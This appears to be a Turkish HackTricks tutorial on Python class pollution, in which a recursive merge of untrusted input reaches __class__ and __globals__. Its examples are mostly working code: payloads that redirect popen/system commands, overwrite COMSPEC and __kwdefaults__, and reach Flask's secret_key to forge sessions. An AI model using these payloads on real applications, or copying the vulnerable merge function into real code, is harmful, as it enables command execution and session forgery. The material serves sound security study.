# Class Pollution (Python's Prototype Pollution)

## Temel Örnek

Bir instance'ın class reference'ı üzerinden `__qualname__` değerinin değiştirilmesi, class'ı ve onun değiştirilebilir base class'larını günceller.<sup>[[1]](#references)</sup>
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Temel Zafiyet Örneği

Özyinelemeli birleştirme, saldırgan tarafından kontrol edilen mapping anahtarlarını kabul edebilir ve item veya attribute erişimi üzerinden iç içe değerler yazabilir.<sup>[[1]](#references)</sup>
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget Örnekleri

<details>

<summary>RCE (subprocess) için sınıf özelliği varsayılan değeri oluşturma</summary>

Paylaşılan bir base class, kardeş sınıftaki bir command gadget tarafından kullanılan varsayılan bir attribute sağlayabilir.<sup>[[1]](#references)</sup>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code> aracılığıyla diğer sınıfları ve global değişkenleri kirletme</summary>

Bir fonksiyonun `__globals__` eşlemesi, o modülde tanımlanan bir yöntemden erişilebilen modül ad alanını açığa çıkarır.<sup>[[1]](#references)[[4]](#references)</sup>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Arbitrary subprocess execution</summary>

Windows'ta `Popen(..., shell=True)`, varsayılan shell olarak `COMSPEC` environment variable'ını kullanır; bu nedenle bu gadget, environment destekli command redirection'ı gösterir.<sup>[[1]](#references)[[5]](#references)</sup>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary><strong><code>__kwdefaults__</code></strong> Üzerine Yazma</summary>

Python, `__kwdefaults__` değerini, bir işlev tanımında `*` veya `*args` sonrasında yer alan yalnızca anahtar sözcük parametrelerinin varsayılan değerlerinin eşlemesi olarak belgeler.<sup>[[4]](#references)</sup> Aşağıdaki gadget, kirletilmiş bir işlev yolu üzerinden bu eşlemeyi üzerine yazar.<sup>[[1]](#references)</sup>
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Dosyalar arasında Flask secret'ını geçersiz kılma</summary>

Polluted object'ın class'ı uygulamanın entry-point module'ünden farklı bir module'de bulunuyorsa, method'larının `__globals__` değeri başlangıçta class module'ünün namespace'ini açığa çıkarır. Loader ve `sys.modules.__main__` üzerinden yapılan bir traversal, daha sonra entry-point module'üne ve Flask `app` object'ine ulaşabilir.<sup>[[1]](#references)[[2]](#references)</sup>
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Flask, session cookie'yi imzalamak için `app.secret_key` kullanır; bu anahtarı bilmek, saldırganın geçerli session verileri oluşturmasına olanak tanır.<sup>[[6]](#references)</sup>

Orijinal writeup, `app.secret_key` değerine ulaşmak için aşağıdaki yolu gösterir; CTFtime da writeup'ın bir kopyasını barındırır.<sup>[[2]](#references)[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Anahtarın değiştirilmesi, yerine geçen session cookie'lerin imzalanmasına olanak tanıyabilir ve privilege escalation sağlayabilir; bkz. [Flask session tooling page](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Daha fazla read-only gadget için aşağıdaki sayfaya da bakın:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Python'da Prototype Pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [idekCTF 2022 task manager writeup (original)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
- [4] [inspect — Canlı nesneleri inceleme](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Subprocess yönetimi](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Flask Documentation](https://flask.palletsprojects.com/en/stable/quickstart/)
{{#include ../../banners/hacktricks-training.md}}
